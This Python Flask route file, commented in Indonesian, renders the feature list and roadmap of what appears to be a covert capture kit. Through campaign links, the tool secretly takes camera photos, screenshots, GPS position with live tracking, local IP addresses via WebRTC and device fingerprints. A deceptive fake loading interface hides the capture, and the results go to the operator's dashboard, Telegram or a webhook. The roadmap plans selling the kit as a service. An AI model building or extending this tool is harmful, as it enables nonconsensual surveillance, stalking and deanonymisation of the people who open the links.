from flask import Blueprint, render_template
from app.auth import login_required

bp = Blueprint("features", __name__)

FEATURES = [
    # (kategori, icon, nama, deskripsi, status, effort)
    ("Capture", "📷", "Foto Depan (Selfie)", "Capture dari kamera depan saat user buka halaman", "aktif", ""),
    ("Capture", "📸", "Foto Belakang", "Capture dari kamera belakang (stream terpisah)", "aktif", ""),
    ("Capture", "🖼️", "Screenshot Halaman", "Rekam tampilan halaman user via html2canvas", "aktif", ""),
    ("Capture", "🌍", "GPS + Akurasi", "Ambil koordinat + tingkat akurasi (meter)", "aktif", ""),
    ("Capture", "📍", "Reverse Geocode", "Konversi GPS ke alamat lengkap (Nominatim)", "aktif", ""),
    ("Capture", "🌐", "IP Publik", "Ambil IP publik via ipapi.co", "aktif", ""),
    ("Capture", "🏠", "IP Lokal (WebRTC)", "Deteksi IP lokal via STUN server", "aktif", ""),
    ("Capture", "🧬", "Fingerprint Device", "Screen, RAM, CPU, timezone, battery", "aktif", ""),
    ("Capture", "🆔", "FingerprintJS ID", "Visitor ID unik dari FingerprintJS", "aktif", ""),
    ("Capture", "🖥️", "User Agent", "Data browser & OS lengkap", "aktif", ""),
    ("Capture", "🕵️", "VPN Detection", "Deteksi apakah user pakai VPN/proxy", "aktif", ""),

    ("Tracking", "🎯", "Multi-Campaign", "URL /c/<nama> untuk banyak campaign", "aktif", ""),
    ("Tracking", "📜", "Event Log", "Catat scroll, click, visibility change", "aktif", ""),
    ("Tracking", "⚡", "Burst Mode", "Auto-capture tiap 3 detik selama 30 detik", "aktif", ""),
    ("Tracking", "👁️", "Tab Visibility", "Deteksi kapan user pindah tab / minimize", "aktif", ""),
    ("Tracking", "🛰️", "Location Tracking", "Update lokasi real-time (watchPosition)", "aktif", ""),

    ("Dashboard", "🔐", "Login Session", "Auth JWT + secure cookie", "aktif", ""),
    ("Dashboard", "📊", "Stats Cards", "Total sesi, foto, GPS, screenshot", "aktif", ""),
    ("Dashboard", "📈", "Chart Timeline", "Grafik sesi 7 hari terakhir (Chart.js)", "aktif", ""),
    ("Dashboard", "🥧", "Chart Top Kota", "Doughnut chart kota dengan sesi terbanyak", "aktif", ""),
    ("Dashboard", "🗺️", "Mini Map", "Peta Leaflet per sesi dengan marker", "aktif", ""),
    ("Dashboard", "🔍", "Detail Modal", "Semua info sesi dalam modal", "aktif", ""),
    ("Dashboard", "📋", "Event Viewer", "Lihat semua event user", "aktif", ""),
    ("Dashboard", "📸", "Burst Viewer", "Grid foto burst mode", "aktif", ""),
    ("Dashboard", "🔎", "Search & Filter", "Cari berdasarkan IP, kota, ISP, campaign", "aktif", ""),
    ("Dashboard", "🗑️", "Hapus Per Sesi", "Hapus satu sesi + semua filenya", "aktif", ""),
    ("Dashboard", "🧹", "Bulk Delete", "Hapus semua sesi sekaligus", "aktif", ""),
    ("Dashboard", "📦", "Export ZIP", "Download semua file + metadata", "aktif", ""),
    ("Dashboard", "📄", "Export CSV", "Download daftar sesi (Excel-ready)", "aktif", ""),

    ("Integrasi", "🤖", "Telegram Notif", "Kirim foto + info ke Telegram", "aktif", ""),
    ("Integrasi", "💬", "Telegram Bot 2-Arah", "Perintah /list /get /del /stats", "aktif", ""),
    ("Integrasi", "🔗", "Webhook", "POST ke URL custom setelah capture", "aktif", ""),
    ("Integrasi", "🕵️", "OSINT Lookup", "IP lookup, HIBP email check, DNS enum", "aktif", ""),

    ("UI/UX", "🎨", "Fake UI Convincing", "Spinner, progress bar, animasi halus", "aktif", ""),
    ("UI/UX", "📱", "PWA", "Installable seperti app asli", "aktif", ""),
    ("UI/UX", "🌙", "Dark Theme", "Modern dark theme", "aktif", ""),
    ("UI/UX", "📐", "Responsive", "Optimal di mobile & desktop", "aktif", ""),
    ("UI/UX", "🔔", "SweetAlert Toast", "Konfirmasi & notifikasi elegan", "aktif", ""),

    ("Keamanan", "🛡️", "CSRF Protection", "Flask-WTF anti-CSRF token", "aktif", ""),
    ("Keamanan", "⏱️", "Rate Limiting", "Batasi request per IP", "aktif", ""),
    ("Keamanan", "🍪", "Secure Cookie", "Session HttpOnly + SameSite", "aktif", ""),
    ("Keamanan", "🧹", "Auto Cleanup", "Hapus data >30 hari otomatis", "aktif", ""),

    ("Ops", "🐳", "Docker Support", "Dockerfile + docker-compose", "aktif", ""),
    ("Ops", "🌐", "Nginx Config", "Reverse proxy + rate limit + gzip", "aktif", ""),
    ("Ops", "📂", "SQLite Database", "Auto-create, zero config", "aktif", ""),
    ("Ops", "🔧", "Path Absolute", "Anti-error di Termux", "aktif", ""),
    ("Ops", "⏳", "Timeout-aware Fetch", "Anti-hang saat upload", "aktif", ""),
    ("Ops", "🔄", "Auto Retry", "Coba ulang upload jika gagal", "aktif", ""),

    # ===== ROADMAP =====
    ("📄 Reports", "📕", "PDF Report", "Generate laporan PDF profesional", "roadmap", "30 menit"),
    ("📄 Reports", "🎥", "Session Replay", "Playback aktivitas user (slider gambar)", "roadmap", "30 menit"),
    ("📄 Reports", "🔥", "Click Heatmap", "Visual cluster klik user", "roadmap", "30 menit"),
    ("📄 Reports", "📉", "Funnel Analytics", "Drop-off analysis per step", "roadmap", "30 menit"),
    ("📄 Reports", "🎬", "Session Replay Video", "Video playback dengan FFmpeg", "roadmap", "4 jam"),

    ("🚀 Advanced", "🗺️", "Live Map Dashboard", "Peta besar semua user real-time", "roadmap", "2 jam"),
    ("🚀 Advanced", "💧", "Screenshot Watermark", "Auto-annotate screenshot dengan IP + waktu", "roadmap", "2 jam"),
    ("🚀 Advanced", "🔐", "Enkripsi At Rest", "AES-256 untuk foto + database", "roadmap", "2 jam"),
    ("🚀 Advanced", "☁️", "Backup S3/R2", "Auto-backup ke cloud storage", "roadmap", "2 jam"),
    ("🚀 Advanced", "📧", "Scheduled Email", "Email report otomatis tiap Senin", "roadmap", "2 jam"),
    ("🚀 Advanced", "🔑", "2FA Login", "Google Authenticator untuk admin", "roadmap", "2 jam"),
    ("🚀 Advanced", "🔌", "API Keys", "API key per klien dengan quota", "roadmap", "2 jam"),
    ("🚀 Advanced", "🚧", "Geo-Fence Alert", "Alert kalau user masuk radius X meter", "roadmap", "2 jam"),
    ("🚀 Advanced", "🎯", "Cross-Session Fingerprint", "Deteksi user sama meski ganti IP", "roadmap", "2 jam"),
    ("🚀 Advanced", "🔍", "Advanced Search", "Query: city:jakarta AND is_vpn:true", "roadmap", "2 jam"),

    ("💎 Enterprise", "🏢", "Multi-Tenant SaaS", "Banyak klien dengan dashboard terpisah", "roadmap", "8 jam"),
    ("💎 Enterprise", "🧠", "AI Analysis", "Auto-summary + anomaly detection (GPT)", "roadmap", "4 jam"),
    ("💎 Enterprise", "📝", "Screenshot OCR", "Extract text dari screenshot (Tesseract)", "roadmap", "4 jam"),
    ("💎 Enterprise", "👤", "Face Detection", "Deteksi wajah di screenshot", "roadmap", "4 jam"),
    ("💎 Enterprise", "👥", "Team Collaboration", "Multi-operator live collaboration", "roadmap", "8 jam"),
    ("💎 Enterprise", "🔌", "WebSocket Realtime", "Update dashboard tanpa refresh", "roadmap", "4 jam"),
    ("💎 Enterprise", "🗄️", "PostgreSQL + Redis", "Migrasi ke production DB", "roadmap", "4 jam"),
    ("💎 Enterprise", "🏷️", "White Label", "Custom logo + warna + domain", "roadmap", "4 jam"),
    ("💎 Enterprise", "📋", "Audit Log", "Compliance ISO 27001 / SOC 2", "roadmap", "4 jam"),

    ("🌟 Ultimate", "💳", "Billing (Stripe)", "Sistem langganan otomatis", "roadmap", "12 jam"),
    ("🌟 Ultimate", "📱", "Mobile App", "Android/iOS app untuk operator", "roadmap", "40 jam"),
    ("🌟 Ultimate", "🧩", "Browser Extension", "Capture langsung dari browser", "roadmap", "8 jam"),
    ("🌟 Ultimate", "☸️", "Kubernetes Deploy", "Auto-scaling production deploy", "roadmap", "15 jam"),
    ("🌟 Ultimate", "⛓️", "Blockchain Audit", "Tamper-proof log untuk evidence", "roadmap", "8 jam"),
]


@bp.route("/features")
@login_required
def features_page():
    # Group by category
    grouped = {}
    for cat, icon, name, desc, status, effort in FEATURES:
        grouped.setdefault(cat, []).append({
            "icon": icon, "name": name, "desc": desc,
            "status": status, "effort": effort,
        })
    total = len(FEATURES)
    active = sum(1 for f in FEATURES if f[4] == "aktif")
    roadmap = total - active
    return render_template("features.html", grouped=grouped,
                           total=total, active=active, roadmap=roadmap)
